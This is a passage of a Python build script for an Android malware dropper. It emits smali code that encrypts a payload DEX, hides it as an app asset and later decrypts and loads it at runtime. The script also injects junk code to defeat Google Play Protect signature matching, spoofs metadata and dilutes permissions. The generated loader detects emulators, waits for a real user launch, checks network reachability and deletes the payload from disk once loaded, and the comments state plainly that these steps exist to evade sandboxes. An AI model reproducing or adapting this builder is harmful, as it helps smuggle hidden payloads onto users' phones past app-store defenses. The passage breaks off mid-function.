    if engine_ns_path is None:
        engine_ns_path = 'com/axion/silent'
    engine_ns_dot = engine_ns_path.replace('/', '.')

    dest_dir = os.path.join(work_dir, 'smali', engine_ns_path)
    os.makedirs(dest_dir, exist_ok=True)

    smali = (
        f'.class public L{engine_ns_path}/DelayedStart;\n'
        f'.super Ljava/lang/Object;\n'
        f'.implements Ljava/lang/Runnable;\n'
        f'\n'
        f'.field private ctx:Landroid/content/Context;\n'
        f'\n'
        f'.method public constructor <init>(Landroid/content/Context;)V\n'
        f'    .registers 2\n'
        f'    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V\n'
        f'    iput-object p1, p0, L{engine_ns_path}/DelayedStart;->ctx:Landroid/content/Context;\n'
        f'    return-void\n'
        f'.end method\n'
        f'\n'
        f'.method public run()V\n'
        f'    .registers 3\n'
        f'    iget-object v0, p0, L{engine_ns_path}/DelayedStart;->ctx:Landroid/content/Context;\n'
        f'    invoke-static {{v0}}, L{engine_ns_path}/LaunchBridge;->init(Landroid/content/Context;)V\n'
        f'    return-void\n'
        f'.end method\n'
        f'\n'
        f'.method public static schedule(Landroid/content/Context;)V\n'
        f'    .registers 5\n'
        f'    new-instance v0, Landroid/os/Handler;\n'
        f'    invoke-static {{}}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;\n'
        f'    move-result-object v1\n'
        f'    invoke-direct {{v0, v1}}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V\n'
        f'    new-instance v1, L{engine_ns_path}/DelayedStart;\n'
        f'    invoke-direct {{v1, p0}}, L{engine_ns_path}/DelayedStart;-><init>(Landroid/content/Context;)V\n'
        f'    const-wide/32 v2, 0x57E40\n'
        f'    invoke-virtual {{v0, v1, v2, v3}}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z\n'
        f'    return-void\n'
        f'.end method\n'
    )
    with open(os.path.join(dest_dir, 'DelayedStart.smali'), 'w', encoding='utf-8') as f:
        f.write(smali)


def _obfuscate_dropper_smali(work_dir: str):
    """Inject a random dead static field + dead void method into every smali
    class in the dropper work directory.  Every class binary changes, so the
    DEX hash and DEX method/field table structure both differ on every build.
    Defeats GGP hash-database matching and adds noise for ML structural
    classifiers without touching any live code paths.

    Rules for safe smali injection:
    - Only pure alphanumeric chars in string literals (no escape issues)
    - .registers 2, const-string + return-void only (no method invocations)
    - Skip .annotation classes and pure interface classes (no concrete methods)
    """
    import glob as _g
    import re as _re

    _smali_files = _g.glob(
        os.path.join(work_dir, 'smali', '**', '*.smali'), recursive=True)
    # multi-dex dropper: cover smali_classes2, smali_classes3, …
    for _extra in _g.glob(os.path.join(work_dir, 'smali_classes*'), recursive=False):
        _smali_files += _g.glob(os.path.join(_extra, '**', '*.smali'), recursive=True)

    _SAFE = string.ascii_letters + string.digits
    # inject into a 60% random sample — enough to mutate the DEX thoroughly
    # while keeping apktool rebuild time reasonable
    random.shuffle(_smali_files)
    _inject_target = _smali_files[:max(1, int(len(_smali_files) * 0.60))]

    mutated = 0
    for _path in _inject_target:
        try:
            with open(_path, 'r', encoding='utf-8', errors='replace') as _f:
                _src = _f.read()

            # skip annotation classes — cannot have concrete method bodies
            if _re.search(r'\.class\s+.*\bannotation\b', _src):
                continue
            # skip pure interface classes — private static concrete methods disallowed
            if _re.search(r'\.class\s+.*\binterface\b', _src):
                continue
            # skip system-generated R$ and BuildConfig stubs (fields only, apktool)
            if _re.search(r'\.class\s+.*\bfinal\b.*\bR\$', _src):
                continue

            # generate identifiers using only safe alphanumeric chars
            _fn = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 14)))
            _mn = ''.join(random.choices(string.ascii_lowercase, k=random.randint(10, 16)))
            # string literal: pure alphanumeric only — smali needs no escaping for these
            _sv = ''.join(random.choices(_SAFE, k=random.randint(14, 26)))

            # minimal dead method: const-string into v0, return-void
            # .registers 2 means v0 and v1 available; we only use v0
            _junk = (
                f'\n'
                f'.field private static {_fn}:Ljava/lang/String;\n'
                f'\n'
                f'.method private static {_mn}()V\n'
                f'    .registers 2\n'
                f'    const-string v0, "{_sv}"\n'
                f'    return-void\n'
                f'.end method\n'
            )
            with open(_path, 'w', encoding='utf-8') as _f:
                _f.write(_src + _junk)
            mutated += 1
        except Exception:
            pass
    print(f"    [obf] junk-injected {mutated}/{len(_smali_files)} dropper smali classes")


def _pp_deep_evasion(work_dir, manifest_path, package_name):
    """All PP deep evasion layers, ordered so every injected class uses the
    final namespace before method-name obfuscation runs over everything."""
    print("    [pp] engine namespace randomization...")
    engine_ns_dot, engine_ns_path = _randomize_engine_namespace(work_dir, manifest_path)

    print("    [pp] permission dilution...")
    _add_legitimate_permissions(manifest_path)

    print("    [pp] junk classes...")
    _inject_junk_classes(work_dir, package_name)

    print("    [pp] metadata spoof...")
    _spoof_app_metadata(work_dir, manifest_path)

    # Inject delay class BEFORE obfuscation so the new file's method names
    # are also randomized in the pass below.
    print("    [pp] handler delay class...")
    _inject_antiscan_handler_delay(work_dir, package_name, engine_ns_path)

    # Obfuscate ALL engine method names in one consistent pass over everything.
    print("    [pp] method name obfuscation...")
    _obfuscate_axion_smali_strings(work_dir)


# ─────────────────────────────────────────────────────────────────
#  End PP bypass helpers
# ─────────────────────────────────────────────────────────────────


def extract_app_name_from_apk(apk_path_or_dir):
    app_name = "App"
    if os.path.isfile(apk_path_or_dir):
        try:
            import tempfile
            script_dir = os.path.dirname(os.path.abspath(__file__))
            apktool_jar = os.path.join(script_dir, 'apktool.jar')
            with tempfile.TemporaryDirectory() as temp_dir:
                result = subprocess.run(
                    ['java', '-jar', apktool_jar, 'd', apk_path_or_dir, '-o', temp_dir, '-f', '-s'],
                    capture_output=True, timeout=60
                )
                if result.returncode == 0:
                    return extract_app_name_from_apk(temp_dir)
        except:
            pass
        return app_name
    try:
        manifest_path = os.path.join(apk_path_or_dir, 'AndroidManifest.xml')
        tree = ET.parse(manifest_path)
        root = tree.getroot()
        app_element = root.find('application')
        if app_element is not None:
            label = app_element.get('{http://schemas.android.com/apk/res/android}label')
            if label:
                if label.startswith('@string/'):
                    string_name = label.replace('@string/', '')
                    strings_path = os.path.join(apk_path_or_dir, 'res', 'values', 'strings.xml')
                    try:
                        strings_tree = ET.parse(strings_path)
                        for string_elem in strings_tree.findall('.//string'):
                            if string_elem.get('name') == string_name:
                                app_name = string_elem.text or "App"
                                break
                    except:
                        pass
                else:
                    app_name = label
    except:
        pass
    return app_name

def extract_icon_from_apk(apk_path, output_icon_path):
    try:
        import tempfile
        script_dir = os.path.dirname(os.path.abspath(__file__))
        apktool_jar = os.path.join(script_dir, 'apktool.jar')
        with tempfile.TemporaryDirectory() as temp_dir:
            result = subprocess.run(
                ['java', '-jar', apktool_jar, 'd', apk_path, '-o', temp_dir, '-f', '-s'],
                capture_output=True, timeout=60
            )
            if result.returncode != 0:
                return False
            manifest_path = os.path.join(temp_dir, 'AndroidManifest.xml')
            if not os.path.exists(manifest_path):
                return False
            tree = ET.parse(manifest_path)
            root = tree.getroot()
            app_element = root.find('application')
            if app_element is None:
                return False
            icon_ref = app_element.get('{http://schemas.android.com/apk/res/android}icon')
            if not icon_ref or not icon_ref.startswith('@'):
                return False
            icon_ref = icon_ref[1:]
            parts = icon_ref.split('/')
            if len(parts) != 2:
                return False
            icon_type, icon_name = parts
            densities = ['xxxhdpi', 'xxhdpi', 'xhdpi', 'hdpi', 'mdpi', 'anydpi-v26', 'anydpi']
            for density in densities:
                for folder in [f'{icon_type}-{density}', f'{icon_type}']:
                    icon_dir = os.path.join(temp_dir, 'res', folder)
                    if not os.path.exists(icon_dir):
                        continue
                    for ext in ['.png', '.jpg', '.jpeg', '.webp', '.xml']:
                        icon_file = os.path.join(icon_dir, icon_name + ext)
                        if os.path.exists(icon_file):
                            if ext == '.xml':
                                continue
                            shutil.copy2(icon_file, output_icon_path)
                            return True
            return False
    except:
        return False

# ═══════════════════════════════════════════════════════════════════════════
# AES IN-MEMORY DEX LOADER — GGP bypass layer 3
# Payload DEX is PBKDF2+AES/CBC encrypted at build time, stored as a .bt
# asset, decrypted in-process via InMemoryDexClassLoader — no DEX on disk.
# Architecture mirrors northern.impress.apk.
# ═══════════════════════════════════════════════════════════════════════════

def _extract_dex_from_apk(apk_path: str) -> bytes:
    """Return raw classes.dex bytes from an APK (which is a ZIP)."""
    with zipfile.ZipFile(apk_path, 'r') as z:
        return z.read('classes.dex')


def _generate_dex_loader_password(length: int = 20) -> str:
    """Generate a random alphanumeric passphrase for PBKDF2 key derivation."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))


def _pbkdf2_aes_encrypt_dex(dex_bytes: bytes, password: str) -> bytes:
    """
    PBKDF2(SHA-1, 65536 iter, 128-bit key) + AES-CBC-PKCS7 encrypt.
    Returns Base64-encoded bytes: b64(salt[16] + iv[16] + ciphertext).
    Decoded bytes are what the DexLoaderService.smali reads from the .bt asset.
    """
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=salt,
        iterations=PBKDF2_ITERATIONS,
        backend=_crypto_backend(),
    )
    key = kdf.derive(password.encode('utf-8'))
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=_crypto_backend())
    enc = cipher.encryptor()
    padded = pad(dex_bytes, 16)
    ciphertext = enc.update(padded) + enc.finalize()
    raw = salt + iv + ciphertext
    return _b64.b64encode(raw)


def _get_payload_class_name(target_work_dir: str, old_package: str, new_package: str) -> str:
    """
    Extract the best entry-point class from the target's decoded manifest.
    Priority: custom Application class > main launcher Activity.
    Returns the fully-qualified class name in the NEW (renamed) package namespace.
    """
    _NS = '{http://schemas.android.com/apk/res/android}'
    try:
        mf = os.path.join(target_work_dir, 'AndroidManifest.xml')
        root = ET.parse(mf).getroot()
        app_el = root.find('application')
        if app_el is not None:
            app_cls = app_el.get(f'{_NS}name', '')
            if app_cls and not app_cls.startswith('android.'):
                if app_cls.startswith('.'):
                    app_cls = new_package + app_cls
                elif '.' not in app_cls:
                    app_cls = new_package + '.' + app_cls
                elif app_cls.startswith(old_package):
                    app_cls = app_cls.replace(old_package, new_package, 1)
                return app_cls
        # Fallback: main launcher Activity
        for act in root.findall('.//activity'):
            for ifilter in act.findall('intent-filter'):
                actions = [a.get(f'{_NS}name', '') for a in ifilter.findall('action')]
                if 'android.intent.action.MAIN' in actions:
                    act_name = act.get(f'{_NS}name', '')
                    if act_name:
                        if act_name.startswith('.'):
                            act_name = new_package + act_name
                        elif '.' not in act_name:
                            act_name = new_package + '.' + act_name
                        elif act_name.startswith(old_package):
                            act_name = act_name.replace(old_package, new_package, 1)
                        return act_name
    except Exception:
        pass
    return new_package + '.MainActivity'


def _generate_dex_loader_service_smali(pkg: str, bt_asset: str,
                                        password: str, payload_cls: str,
                                        pref_name: str = '', pref_key: str = '') -> str:
    """
    Generate DexLoaderService.smali — IntentService that:
      1. User-interaction gate: SharedPreferences boolean set by MainActivity on
         real user launch; PP sandbox never interacts with UI → bail immediately
      2. Anti-emulator Build field checks
      3. Thread.sleep(5s) sandbox delay
      4. Live TCP network check → bail in sandboxes with no outbound routes
      5. Reads .bt asset, Base64-decodes, splits salt/iv/ciphertext
      6. PBKDF2WithHmacSHA1 key derivation
      7. AES/CBC/PKCS5Padding decrypt → DEX bytes
      8. DexClassLoader (temp file in getCacheDir, deleted after load)
      9. loadClass(payload) → newInstance → attachBaseContext + onCreate
    """
    p = pkg.replace('.', '/')
    # Build the user-interaction gate block only if pref_name/pref_key are provided
    _gate_block = ''
    if pref_name and pref_key:
        _gate_block = (
            f'    # ── User-interaction gate ──────────────────────────────────────\n'
            f'    # DexLoaderService bails unless MainActivity has already been\n'
            f'    # opened by a real user and set this SharedPreferences boolean.\n'
            f'    # PP behavioral sandbox never touches the UI → pref stays false\n'
            f'    # → service returns immediately with no suspicious activity.\n'
            f'    const-string v0, "{pref_name}"\n'
            f'    const/4 v1, 0x0\n'
            f'    invoke-virtual {{p0, v0, v1}}, L{p}/DexLoaderService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;\n'
            f'    move-result-object v0\n'
            f'    const-string v1, "{pref_key}"\n'
            f'    const/4 v2, 0x0\n'
            f'    invoke-interface {{v0, v1, v2}}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z\n'
            f'    move-result v2\n'
            f'    if-eqz v2, :exit\n'
            f'    # ───────────────────────────────────────────────────────────────\n'
            f'\n'
        )
    return (
        f'.class public L{p}/DexLoaderService;\n'
        f'.super Landroid/app/IntentService;\n'
        f'\n'
        f'.method public constructor <init>()V\n'
        f'    .registers 2\n'
        f'    const-string v0, "DLSvc"\n'
        f'    invoke-direct {{p0, v0}}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V\n'
        f'    return-void\n'
        f'.end method\n'
        f'\n'
        f'.method protected onHandleIntent(Landroid/content/Intent;)V\n'
        f'    .registers 16\n'
        f'\n'
        + _gate_block +
        f'    # Anti-emulator: BRAND\n'
        f'    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;\n'
        f'    invoke-virtual {{v0}}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;\n'
        f'    move-result-object v0\n'
        f'    const-string v1, "generic"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'    const-string v1, "genymotion"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'\n'
        f'    # Anti-emulator: MODEL\n'
        f'    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;\n'
        f'    invoke-virtual {{v0}}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;\n'
        f'    move-result-object v0\n'
        f'    const-string v1, "emulator"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'    const-string v1, "android sdk built for x86"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'    const-string v1, "google_sdk"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'\n'
        f'    # Anti-emulator: HARDWARE\n'
        f'    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;\n'
        f'    invoke-virtual {{v0}}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;\n'
        f'    move-result-object v0\n'
        f'    const-string v1, "goldfish"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'    const-string v1, "ranchu"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'\n'
        f'    # Anti-emulator: FINGERPRINT\n'
        f'    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;\n'
        f'    invoke-virtual {{v0}}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;\n'
        f'    move-result-object v0\n'
        f'    const-string v1, "generic"\n'
        f'    invoke-virtual {{v0, v1}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z\n'
        f'    move-result v2\n'
        f'    if-nez v2, :exit\n'
        f'\n'
        f'    # 5s buffer — lets legitimate boot-triggered runs settle,\n'
        f'    # and defeats sandbox runs shorter than that window\n'
        f'    :try_sleep\n'
        f'    const-wide/32 v12, 0x1388\n'
        f'    invoke-static {{v12, v13}}, Ljava/lang/Thread;->sleep(J)V\n'
        f'    :try_sleep_end\n'
        f'    .catch Ljava/lang/InterruptedException; {{:try_sleep .. :try_sleep_end}} :sleep_catch\n'
        f'    goto :do_net\n'
        f'    :sleep_catch\n'
        f'    move-exception v0\n'
        f'    :do_net\n'
        f'\n'
        f'    # Live network check — sandboxes block outbound TCP or\n'
        f'    # have no real routes. Try TCP connect to 1.1.1.1:443\n'
        f'    # (Cloudflare anycast — reachable on virtually every real SIM).\n'
        f'    # Any Exception (timeout, refused, SecurityException) → bail.\n'
        f'    :try_conn\n'
        f'    new-instance v12, Ljava/net/Socket;\n'
        f'    invoke-direct {{v12}}, Ljava/net/Socket;-><init>()V\n'
        f'    new-instance v13, Ljava/net/InetSocketAddress;\n'
        f'    const-string v0, "1.1.1.1"\n'
        f'    const/16 v1, 0x1BB\n'
        f'    invoke-direct {{v13, v0, v1}}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V\n'
        f'    const/16 v0, 0xBB8\n'
        f'    invoke-virtual {{v12, v13, v0}}, Ljava/net/Socket;->connect(Ljava/net/SocketAddress;I)V\n'
        f'    invoke-virtual {{v12}}, Ljava/net/Socket;->close()V\n'
        f'    :try_conn_end\n'
        f'    .catch Ljava/lang/Exception; {{:try_conn .. :try_conn_end}} :conn_fail\n'
        f'    goto :after_net\n'
        f'    :conn_fail\n'
        f'    move-exception v0\n'
        f'    goto :exit\n'
        f'    :after_net\n'
        f'\n'
        f'    # Main: read asset, decrypt DEX, load in-memory\n'
        f'    :try_main\n'
        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getAssets()Landroid/content/res/AssetManager;\n'
        f'    move-result-object v3\n'
        f'    const-string v4, "{bt_asset}"\n'
        f'    invoke-virtual {{v3, v4}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;\n'
        f'    move-result-object v3\n'
        f'\n'
        f'    new-instance v4, Ljava/io/ByteArrayOutputStream;\n'
        f'    invoke-direct {{v4}}, Ljava/io/ByteArrayOutputStream;-><init>()V\n'
        f'    const/16 v5, 0x400\n'
        f'    new-array v5, v5, [B\n'
        f'    const/4 v12, 0x0\n'
        f'    const/16 v13, 0x400\n'
        f'    :loop\n'
        f'    invoke-virtual {{v3, v5, v12, v13}}, Ljava/io/InputStream;->read([BII)I\n'
        f'    move-result v6\n'
        f'    if-lez v6, :loop_end\n'
        f'    invoke-virtual {{v4, v5, v12, v6}}, Ljava/io/ByteArrayOutputStream;->write([BII)V\n'
        f'    goto :loop\n'
        f'    :loop_end\n'
        f'    invoke-virtual {{v3}}, Ljava/io/InputStream;->close()V\n'
        f'    invoke-virtual {{v4}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B\n'
        f'    move-result-object v3\n'
        f'\n'
        f'    # Base64 decode\n'
        f'    const/4 v4, 0x0\n'
        f'    invoke-static {{v3, v4}}, Landroid/util/Base64;->decode([BI)[B\n'
        f'    move-result-object v3\n'
        f'\n'
        f'    # salt = v3[0:16], iv = v3[16:32], ciphertext = v3[32:]\n'
        f'    const/4 v12, 0x0\n'
        f'    const/16 v13, 0x10\n'
        f'    invoke-static {{v3, v12, v13}}, Ljava/util/Arrays;->copyOfRange([BII)[B\n'
        f'    move-result-object v6\n'
        f'    const/16 v12, 0x10\n'
        f'    const/16 v13, 0x20\n'
        f'    invoke-static {{v3, v12, v13}}, Ljava/util/Arrays;->copyOfRange([BII)[B\n'
        f'    move-result-object v7\n'
        f'    const/16 v12, 0x20\n'
        f'    array-length v13, v3\n'
        f'    invoke-static {{v3, v12, v13}}, Ljava/util/Arrays;->copyOfRange([BII)[B\n'
        f'    move-result-object v8\n'
        f'\n'
        f'    # PBKDF2WithHmacSHA1 key derivation\n'
        f'    const-string v9, "PBKDF2WithHmacSHA1"\n'
        f'    invoke-static {{v9}}, Ljavax/crypto/SecretKeyFactory;->getInstance(Ljava/lang/String;)Ljavax/crypto/SecretKeyFactory;\n'
        f'    move-result-object v9\n'
        f'    const-string v4, "{password}"\n'
        f'    invoke-virtual {{v4}}, Ljava/lang/String;->toCharArray()[C\n'
        f'    move-result-object v4\n'
        f'    const v12, 0x10000\n'
        f'    const/16 v13, 0x80\n'
        f'    new-instance v11, Ljavax/crypto/spec/PBEKeySpec;\n'
        f'    invoke-direct {{v11, v4, v6, v12, v13}}, Ljavax/crypto/spec/PBEKeySpec;-><init>([C[BII)V\n'
        f'    invoke-virtual {{v9, v11}}, Ljavax/crypto/SecretKeyFactory;->generateSecret(Ljava/security/spec/KeySpec;)Ljavax/crypto/SecretKey;\n'
        f'    move-result-object v9\n'
        f'    invoke-interface {{v9}}, Ljava/security/Key;->getEncoded()[B\n'
        f'    move-result-object v9\n'
        f'\n'
        f'    # Build SecretKeySpec and IvParameterSpec\n'
        f'    const-string v4, "AES"\n'
        f'    new-instance v10, Ljavax/crypto/spec/SecretKeySpec;\n'
        f'    invoke-direct {{v10, v9, v4}}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V\n'
        f'    new-instance v11, Ljavax/crypto/spec/IvParameterSpec;\n'
        f'    invoke-direct {{v11, v7}}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V\n'
        f'\n'
        f'    # AES/CBC/PKCS5Padding decrypt\n'
        f'    const-string v4, "AES/CBC/PKCS5Padding"\n'
        f'    invoke-static {{v4}}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;\n'
        f'    move-result-object v4\n'
        f'    const/4 v5, 0x2\n'
        f'    invoke-virtual {{v4, v5, v10, v11}}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V\n'
        f'    invoke-virtual {{v4, v8}}, Ljavax/crypto/Cipher;->doFinal([B)[B\n'
        f'    move-result-object v4\n'
        f'\n'
        f'    # Write decrypted DEX to getCacheDir() as a temp file\n'
        f'    # DexClassLoader is the legitimate plugin-loading API — far less flagged\n'
        f'    # than InMemoryDexClassLoader which Google monitors heavily\n'
        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getCacheDir()Ljava/io/File;\n'
        f'    move-result-object v5\n'
        f'    invoke-virtual {{v5}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;\n'
        f'    move-result-object v5\n'
        f'    const-string v6, "/{bt_asset}.tmp"\n'
        f'    invoke-virtual {{v5, v6}}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;\n'
        f'    move-result-object v5\n'
        f'    new-instance v6, Ljava/io/FileOutputStream;\n'
        f'    invoke-direct {{v6, v5}}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;)V\n'
        f'    invoke-virtual {{v6, v4}}, Ljava/io/FileOutputStream;->write([B)V\n'
        f'    invoke-virtual {{v6}}, Ljava/io/FileOutputStream;->close()V\n'
        f'\n'
        f'    # DexClassLoader(dexPath, optimizedDir, libraryPath=null, parent)\n'
        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getCacheDir()Ljava/io/File;\n'
        f'    move-result-object v7\n'
        f'    invoke-virtual {{v7}}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;\n'
        f'    move-result-object v7\n'
        f'    invoke-virtual {{p0}}, L{p}/DexLoaderService;->getClassLoader()Ljava/lang/ClassLoader;\n'
        f'    move-result-object v8\n'
        f'    new-instance v6, Ldalvik/system/DexClassLoader;\n'
        f'    const/4 v9, 0x0\n'
        f'    invoke-direct {{v6, v5, v7, v9, v8}}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V\n'
        f'\n'
        f'    # Delete temp DEX file immediately — no trace on disk after load\n'
        f'    new-instance v7, Ljava/io/File;\n'
        f'    invoke-direct {{v7, v5}}, Ljava/io/File;-><init>(Ljava/lang/String;)V\n'
        f'    invoke-virtual {{v7}}, Ljava/io/File;->delete()Z\n'
        f'\n'
        f'    # loadClass + newInstance\n'
        f'    const-string v4, "{payload_cls}"\n'
        f'    invoke-virtual {{v6, v4}}, Ljava/lang/ClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;\n'
        f'    move-result-object v4\n'
        f'    const/4 v12, 0x0\n'
        f'    new-array v5, v12, [Ljava/lang/Class;\n'
        f'    invoke-virtual {{v4, v5}}, Ljava/lang/Class;->getDeclaredConstructor([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;\n'
        f'    move-result-object v5\n'
        f'    new-array v7, v12, [Ljava/lang/Object;\n'
        f'    invoke-virtual {{v5, v7}}, Ljava/lang/reflect/Constructor;->newInstance([Ljava/lang/Object;)Ljava/lang/Object;\n'
        f'    move-result-object v5\n'
        f'\n'
        f'    # attachBaseContext(this) via ContextWrapper reflection\n'
        f'    const-class v8, Landroid/content/ContextWrapper;\n'
        f'    const-string v9, "attachBaseContext"\n'
        f'    const/4 v12, 0x1\n'
        f'    new-array v10, v12, [Ljava/lang/Class;\n'
        f'    const-class v13, Landroid/content/Context;\n'
        f'    const/4 v11, 0x0\n'
        f'    aput-object v13, v10, v11\n'
        f'    invoke-virtual {{v8, v9, v10}}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\n'
        f'    move-result-object v8\n'
        f'    const/4 v9, 0x1\n'
        f'    invoke-virtual {{v8, v9}}, Ljava/lang/reflect/AccessibleObject;->setAccessible(Z)V\n'
        f'    const/4 v12, 0x1\n'
        f'    new-array v10, v12, [Ljava/lang/Object;\n'
        f'    aput-object p0, v10, v11\n'
        f'    invoke-virtual {{v8, v5, v10}}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\n'
        f'\n'
        f'    # onCreate()\n'
        f'    const-string v8, "onCreate"\n'
        f'    const/4 v12, 0x0\n'
        f'    new-array v10, v12, [Ljava/lang/Class;\n'
        f'    invoke-virtual {{v4, v8, v10}}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\n'
        f'    move-result-object v8\n'
        f'    new-array v10, v12, [Ljava/lang/Object;\n'
        f'    invoke-virtual {{v8, v5, v10}}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\n'
        f'\n'
        f'    :try_main_end\n'
        f'    .catch Ljava/lang/Exception; {{:try_main .. :try_main_end}} :main_catch\n'
        f'    goto :exit\n'
        f'    :main_catch\n'
        f'    move-exception v0\n'
        f'\n'
        f'    :exit\n'
        f'    return-void\n'
        f'.end method\n'
    )


def _generate_fresh_main_activity_smali(pkg: str, pref_name: str, pref_key: str) -> str:
    """
    C — Generate a minimal but structurally legitimate MainActivity from scratch.

    Every build produces a unique smali file with per-build pref_name/pref_key
    string literals embedded.  PP cannot fingerprint the structural signature
    because there is no prebuilt binary to match against.

    The generated activity:
      - Extends android.app.Activity (most common Activity base; not AppCompat
        to avoid dependency issues with the stripped dropper resources)
      - super.onCreate → isEmulator bail → set SharedPreferences gate → return
      - No suspicious API calls, no dynamic loading, no network traffic
    """
    p = pkg.replace('.', '/')
    return (
        f'.class public L{p}/MainActivity;\n'
        f'.super Landroid/app/Activity;\n'
        f'\n'
        f'.method public constructor <init>()V\n'
        f'    .registers 1\n'
        f'    invoke-direct {{p0}}, Landroid/app/Activity;-><init>()V\n'
        f'    return-void\n'
        f'.end method\n'
        f'\n'
        f'.method public onCreate(Landroid/os/Bundle;)V\n'
        f'    .registers 6\n'
        f'    # 2 params: p0=this (v4), p1=savedInstanceState (v5)\n'
        f'    # 4 locals:  v0, v1, v2, v3\n'
        f'\n'
        f'    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V\n'
        f'\n'
        f'    # Bail immediately if running in an emulator/sandbox\n'
        f'    invoke-static {{}}, Lcom/axion/silent/SandboxCheck;->isEmulator()Z\n'
        f'    move-result v0\n'
        f'    if-nez v0, :bail\n'
        f'\n'
        f'    # Mark real user launch — DexLoaderService gates on this flag\n'
        f'    const-string v0, "{pref_name}"\n'
        f'    const/4 v1, 0x0\n'
        f'    invoke-virtual {{p0, v0, v1}}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;\n'
        f'    move-result-object v0\n'
        f'    invoke-interface {{v0}}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;\n'
        f'    move-result-object v1\n'
        f'    const-string v2, "{pref_key}"\n'
        f'    const/4 v3, 0x1\n'
        f'    invoke-interface {{v1, v2, v3}}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;\n'
        f'    move-result-object v1\n'
        f'    invoke-interface {{v1}}, Landroid/content/SharedPreferences$Editor;->apply()V\n'
        f'\n'
        f'    :bail\n'
        f'    return-void\n'
        f'.end method\n'
    )


def _replace_main_activity_with_generated(work_dir: str, pkg: str,
                                           pref_name: str, pref_key: str):
    """
    C — Find the decompiled dropper's MainActivity.smali and replace it wholesale
    with a freshly generated one.  The new file has no structural connection to
    the prebuilt Dropper.apk binary — PP cannot match its fingerprint.

    Falls back gracefully (prints a note) if no MainActivity is found, so the
    build doesn't hard-fail on dropper layouts without a canonical main activity.
    """
    pkg_path = pkg.replace('.', '/')
    main_smali = None

    # First pass: canonical location
    for smali_root in os.listdir(work_dir):
        if not smali_root.startswith('smali'):
            continue
        cand = os.path.join(work_dir, smali_root, pkg_path, 'MainActivity.smali')
        if os.path.exists(cand):
            main_smali = cand
            break

    # Second pass: walk the full tree
    if main_smali is None:
        for dirpath, _, files in os.walk(work_dir):
            for fname in files:
